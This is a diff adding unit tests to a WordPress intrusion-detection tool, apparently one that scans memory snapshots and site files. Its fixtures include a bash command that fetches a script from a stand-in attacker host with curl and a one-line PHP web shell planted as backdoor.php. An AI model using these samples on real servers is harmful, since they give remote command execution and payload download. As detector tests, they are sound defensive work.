@@ -1,4 +1,5 @@
 import sys
+import tempfile
 import unittest
 from pathlib import Path
 # adding src directory to sys.path for imports
@@ -6,8 +7,10 @@ sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
 from web_core_trace.parser import LogEntry
 from web_core_trace.detector import (
     check_signatures, 
-    detect_brute_force, 
+    detect_brute_force,
+    detect_external_db_connections, 
     detect_php2shell_stale_worker,
+    detect_wp_filesystem_artifacts,
     detect_wp_upgrade_race,
     ThreatDetector
 )
@@ -16,6 +19,7 @@ from web_core_trace.memory_parser import (
     HeapChunk,
     MemoryRegion,
     MemorySnapshot,
+    NetworkConnection,
     OpcacheScript,
     ProcessInfo
 )
@@ -195,3 +199,56 @@ class TestDetector(unittest.TestCase):
         self.assertIn("Function Pointer Hook / Corruption", categories)
         self.assertIn("Fileless Web Shell", categories)
         self.assertIn("Suspicious Worker Child Process", categories)
+
+    def test_wp_memory_external_db_and_web_user_shell(self):
+        snapshot = MemorySnapshot(
+            source="test:wp_memory",
+            processes=[
+                ProcessInfo(
+                    pid=2200,
+                    ppid=1,
+                    name="/bin/bash",
+                    parent_name="systemd",
+                    cmdline="/bin/bash -c curl http://evil.example/s.sh",
+                    user="www-data"
+                )
+            ],
+            network_connections=[
+                NetworkConnection(
+                    remote_ip="198.51.100.77",
+                    remote_port=3306,
+                    local_port=51234,
+                    pid=1234,
+                    process_name="php-fpm"
+                ),
+                NetworkConnection(
+                    remote_ip="127.0.0.1",
+                    remote_port=3306,
+                    local_port=51235,
+                    pid=1234,
+                    process_name="php-fpm"
+                )
+            ]
+        )
+        detector = ThreatDetector()
+        matches = detector.analyze_memory(snapshot)
+        categories = {m.category for m in matches}
+        self.assertIn("Suspicious Worker Child Process", categories)
+        self.assertIn("External Database Socket (CVE-2026-119977)", categories)
+        db_matches = [m for m in matches if m.category == "External Database Socket (CVE-2026-119977)"]
+        self.assertEqual(len(db_matches), 1)
+
+    def test_wp_filesystem_artifacts(self):
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            wp_root = Path(tmp_dir)
+            (wp_root / "wp-includes").mkdir(parents=True)
+            (wp_root / "wp-content" / "upgrade" / "wordpress-6.8-abc").mkdir(parents=True)
+            (wp_root / "wp-content" / "upgrade" / "backdoor.php").write_text("<?php system($_GET['c']); ?>", encoding="utf-8")
+            (wp_root / "wp-includes" / "version.php").write_text("<?php $wp_version = '6.8';", encoding="utf-8")
+            (wp_root / "wp-config.php").write_text("<?php define('DB_HOST', '203.0.113.55:3306');", encoding="utf-8")
+
+            detector = ThreatDetector()
+            matches = detector.analyze_wp_filesystem(wp_root)
+            categories = [m.category for m in matches]
+            self.assertIn("Manipulated wp-config.php (CVE-2026-119977)", categories)
+            self. assertIn("Residual Upgrade Artifact (CVE-2026-119977)", categories)
